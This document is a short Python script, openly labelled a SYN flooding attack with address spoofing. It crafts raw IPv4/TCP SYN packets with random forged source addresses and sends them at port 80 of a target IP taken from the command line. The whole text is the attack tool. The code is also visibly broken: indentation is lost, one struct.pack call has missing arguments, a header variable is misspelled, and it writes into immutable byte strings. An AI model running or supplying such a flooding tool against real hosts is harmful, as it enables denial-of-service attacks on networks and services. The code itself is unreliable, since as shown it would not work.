#SYN flooding attack with address spoofing
import socket as sc
import random
import struct
import sys

def checksum(packet):
plen = len(packet)
if plen%2 == 1:
plen += 1
packet.append(0) # pad a 0 if length is odd

sum = 0
for i in range(0, plen//2):
sum += packet[2*i]*256 + packet[2*i+1]

sum = (sum >> 16) + (sum & 0xffff)
return 0xffff - sum

if len(sys.argv) != 2:
print("Target IP needed")
exit()

s = sc.socket(sc.AF_INET, sc.SOCK_RAW, sc.IPPROTO_TCP)
s.setsockopt(sc.IPPROTO_IP, sc.IP_HDRINCL, 1) # we make IPv4 header
count = 0
while count < 100:
srcIP = random.randint(0,2**32-1)
srcPort = random.randint(49152, 2**16-1)
target = sc.inet_aton(sys.argv[1])
iphdr = b'\x45\x00\x00\x28gc\x00\x00' # first 8 bytes of IPv4
iphdr += b'\x80\x06\x00\x00' # TTL + PROTOL + HDR_CKSUM
iphdr += struct.pack('>I4s', srcIP, target)
# to make TCP hdr
tcphdr = struct.pack('>HH')
tcphr = struct.pack('>HHII', srcPort, 80, random.randint(0,2**32-1), 0)
tcphdr += b'\x50\x02\x44\x55'
tcphdr += b'\x00\x00\x00\x00' # WIN_SIZE + TCP_CKSUM + URG_PTR

pseudo_iphdr = iphdr[12:] + b'\x00\x06\x00\x14'
chsum_tcp = checksum(pseudo_iphdr+tcphdr)
chsum_ip = checksum(iphdr)
iphdr[10] = chsum_ip//256
iphdr[11] = chsum_ip%256
tcphdr[16] = chsum_tcp//256
tcphdr[17] = chsum_tcp%256
s.sendto(iphdr+tcphdr, (sys.argv[1], 0))
count+=1